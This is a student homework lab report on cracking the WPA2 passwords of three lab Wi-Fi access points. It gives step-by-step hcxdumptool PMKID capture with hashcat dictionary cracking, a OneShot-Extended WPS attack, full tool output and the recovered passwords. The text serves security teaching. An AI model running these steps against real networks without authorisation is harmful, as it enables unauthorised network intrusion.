# Homework 8

## Decryption results


| place            | BSSID             | password            | ENC-AUTH     | methods  |
|:-------------- |:----------------- |:------------------- |:--------- |:-------- |
| 電子資訊大樓八樓 | E8:94:F6:A0:08:AE | limpbizkit          | WPA2-PSK    | method 1 |
| 工程三館三樓     | 54:B8:0A:13:16:A6 | infornationsecurity | WPA2-PSK    | method 2 |
| 管理二館一樓     | C4:12:F5:0A:B6:07 | lissabon            | WPA2-PSK  | method 1 |

## Methods 1 : [use hcxdumptool get PMKID and use Hashcat cracking](https://github.com/ZerBea/hcxdumptool/blob/master/docs/example.md)

### Step 1: update Dependencies
```
sudo service NetworkManager restart
(----------connect available network-wifi----------)
sudo update
sudo apt install hcxdumptool hcxtools -y
```
### Step 1: Check and Open Monitor interface
```
iwconfig
sudo airmon-ng check kill
sudo airmon-ng start <Network Interface>
iwconfig
```
> **`<Network Interface>`**: wlan0, wlan1 \
> **`<monitor interface>`**: wlan1mon, wlan0mon \
> **network interface start success: (...for [phy1]wlan1 on [phy1]wlan1mon)** 

### Step 3: Start Monitoring
```
sudo airodump-ng <monitor interface>
```
> get information: BSSID, channal, ENC, ESSID
    
### Step 4: create attack file
```
hcxdumptool --bpfc="wlan addr <BSSID lower case>" >> attack.bpf
(e.g hcxdumptool --bpfc="wlan addr e894f6a008ae" >> attack.bpf)
```
>**`<BSSID lower case>`**: E8:94:F6:A0:08:AE -> e894f6a008ae     
    
### Step 5: Packet Sniffing attack
```
sudo hcxdumptool -i <monitor interface> -c <channal>a --bpf=attack.bpf -w TestAP.pcapng --rds=1
(e.g sudo hcxdumptool -i wlan1mon -c 7a --bpf=attack.bpf -w TestAP.pcapng --rds=1)

    
This is a highly experimental penetration testing tool!
It is made to detect vulnerabilities in your NETWORK mercilessly!
Misuse within a network, without specific authorization, may cause
irreparable damage and result in significant consequences!
Not understanding what you were doing is not going to work as an excuse!

starting ...
    
    
Session Actions Edit View Help

 CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID          (SCAN:  2457/10)
----+--------+------+------------+------------+-------------------------------
  10|12:26:38|ep+  +|b0febddb7598|c412f50ab607|IAIS-NS-30015
                   ^
            (紅線標記處取得PMKID)
 3510 Packet(s) captured by kernel
 0 Packet(s) dropped by kernel
 exit on sigterm
```   

> **EA123P**
> **+:** Indicates a newly received packet corresponding to one of the EA123P types. \
> **1:** The challenge message sent from the Router/AP to the Client. \
> **2:** The Client's response to the Router. This is the most important; it is essential. \
> **3:** The Router's confirmation message. \
> **P:** PMKID (No user connection required / Client-less). As long as the router has roaming features enabled, the tool can interact directly with the router to capture this packet. \
> **Cracking Requirement: P OR 1+2**
    
### Step 6: Conversion to .hc22000 (hashcat support format) 
```
hcxpcapngtool -o TestAP.hc22000 TestAP.pcapng


summary capture file
--------------------
file name....................................: TestAP.pcapng
version (pcapng).............................: 1.0
operating system.............................: Linux 6.12.38+kali-amd64
application..................................: hcxdumptool 7.0.0
interface name...............................: wlan0mon
......    ......    ......
......    ......    ......
......    ......    ......
session summary    
---------------
processed pcapng files..............: 1   
```
> **Success: session summary ---- processed pcapng files ...: 1**    

### Step 7: Use hashcat cracking the PSK of our target network
```
sudo hashcat -a 0 -m 22000 ./TestAP.hc22000 ./usr/share/wordlists/nmap.lst
```      
> ./usr/share/wordlists/: can choose othor xxx.lst dictionary

### Result 
#### Monitoring result (==IAIS-NS-30015==)
1. E8:94:F6:A0:08:AE   
```
Session Actions Edit View Help

 CH  3 ][ Elapsed: 6 s ][ 2025-12-02 18:13

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER AUTH ESSID

 00:E0:4C:11:22:8A   -1        0        0    0   3   -1                    <length:  0>
 B4:75:0E:52:A3:0C  -74        2        1    0   3  195   WPA2 CCMP   PSK  E03super
 92:48:B8:43:52:AC  -66        1        3    0   3  130   WPA2 CCMP   PSK  NYCUent
 5A:A6:E6:DE:21:24  -72        2        0    0   2  130   OPN              TP-Link_Guest_2124
 B0:95:75:D5:5D:CB  -65        2        0    0   7  130   WPA2 CCMP   PSK  IAIS-NS-30015
 F8:94:F6:A0:08:AE  -70        2        0    0   7  130   WPA2 CCMP   PSK  IAIS-NS-30015
```
> ESSID: IAIS-NS-30015 \
> BSSID: F8:94:F6:A0:08:AE \
> channal: 7 \
> ENC: WPA2
    
2. C4:12:F5:0A:B6:07 
```
┌──(kali㉿kali)-[~]
└─$ sudo airodump-ng wlan0mon

 CH  7 ][ Elapsed: 0 s ][ 2025-12-16 11:50

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER AUTH ESSID

 9C:8C:D8:DA:78:64  -75        2        0    0   6  130   OPN              NYCU-Seminar
 9C:8C:D8:DA:78:63  -75        2        0    0   6  130   OPN              NYCU-Guest
 9C:8C:D8:DA:78:62  -74        2        3    0   6  130   WPA2 CCMP   MGT  NYCU
 9C:8C:D8:DA:78:60  -74        2        0    0   6  130   WPA2 CCMP   MGT  eduroam
 AC:22:0B:92:EE:70  -57        4        1    0   6  130   WPA2 CCMP   PSK  Mb005
 B0:6E:BF:3E:E3:18  -79        1        1    0  10  195   WPA2 CCMP   PSK  FinTech_AI
 C4:12:F5:0A:B6:07  -58        4        0    0  10  270   WPA2 CCMP   PSK  IAIS-NS-30015
```  
> ESSID: IAIS-NS-30015 \
> BSSID: C4:12:F5:0A:B6:07 \
> channal: 10 \
> ENC: WPA2
    
#### Cracking result  
1. E8:94:F6:A0:08:AE   
```
┌──(kali㉿kali)-[~]
└─$ sudo hashcat -a 0 -m 22000 ./TestAP.hc22000 /usr/share/wordlists/nmap.lst
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 6876/13817 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/nmap.lst
* Passwords.: 5007
* Bytes.....: 40146
* Keyspace..: 5007
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.

85b1e9551fe6d292cca561521fb24629:e894f6a008ae:b29575055dcb:IAIS-NS-30015:limpbizkit

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: ./TestAP.hc22000
Time.Started.....: Tue Dec  2 19:56:21 2025 (0 secs)
Time.Estimated...: Tue Dec  2 19:56:21 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/nmap.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2328 H/s (6.70ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5007/5007 (100.00%)
Rejected.........: 3533/5007 (70.56%)
Restore.Point....: 4472/5007 (89.31%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 19941994 -> fernandes
Hardware.Mon.#1..: Temp: 51c Util: 34%

Started: Tue Dec  2 19:55:19 2025
Stopped: Tue Dec  2 19:56:22 2025
```  

> **password: limpbizkit**

    
2. C4:12:F5:0A:B6:07 
```
┌──(kali㉿kali)-[~]
└─$ sudo hashcat -a 0 -m 22000 ./TestAP.hc22000 /usr/share/wordlists/john.lst 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 6876/13817 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/john.lst
* Passwords.: 3559
* Bytes.....: 26326
* Keyspace..: 3559

Approaching final keyspace - workload adjusted.

897a61147d8095e270ed4ea7a3035c0e:c412f50ab607:b0febddb7598:IAIS-NS-30015:lissabon

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: ./TestAP.hc22000
Time.Started.....: Tue Dec 16 13:07:40 2025 (0 secs)
Time.Estimated...: Tue Dec 16 13:07:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/john.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     9102 H/s (4.26ms) @ Accel:64 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3559/3559 (100.00%)
Rejected.........: 2920/3559 (82.05%)
Restore.Point....: 2705/3559 (76.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: prometheus -> newcourt
Hardware.Mon.#1..: Temp: 49c Util: 20%
....
```    
> **password: lissabon**

    
## Methods 2 : [OneShot-Extended](https://hackmd.io/_uploads/SJCgWcCzbx.png)

    
### Step 1: Install Dependencies
```
sudo apt install python3 wpa-supplicant iw wget pixiewps
```
### Step 2: Clone the Repository and Navigate to the Directory
```
cd ~
git clone https://github.com/chickendrop89/OneShot-Extended ose
```
### Step 3: List Directory Contents and Navigate into the Cloned Repository
```
ls
cd ose
dir
ls -r
```
Check if there is an ose.py file.
### Step 4: Run OneShot-Extended
``` 
sudo python ose.py -i wlan0
sudo python ose.py  -i wlan0 --pbc
```
Scan with the specified Wi-Fi adapter / attempt a WPS PIN attack.
```--pbc```: Push Button Configuration. 
Try connecting the AP using WPS's button pairing mode.

### Results
```
Running wa_supplicant.
Starting WS push button connection
Scanning...
Selected AP: 54:B8:0A:13:16:A6
Authenticating...
Authenticated
Associating with AP...
Associated with 54:B8:0A:13:16:A6 (ESSID: IAIS-NS-30015)
Scanning...
Associated with A6:DD:22:58:2F:45 (ESSID: IAIS-NS-30015)
Sending EAPOL Start...
Scanning...
Selected AP: 54:B8:0A:13:16:A6
Authenticating...
Authenticated
Associating with AP...
Associated with 54:88:0A:13:16:A6 (ESSID: IAIS-NS-30015)
Sending EAPOL Start...
Received Identity Request
Sending Identity Response...
Sending WPS Message M1...
Received WPS Message M2
Sending WPS Message M3...
Received WPS Message M4
Sending WPS Message M5...
Received WPS Message M6
Sending WPS Message M7...
Received WPS Message M8
WPS PIN: '<PBC mode›'
WPA PSK: 'infornationsecurity'
AP SSID: 'IAIS-NS-30015'
```
> **password: infornationsecurity**


> [!NOTE]
> 這是補充說明的資訊。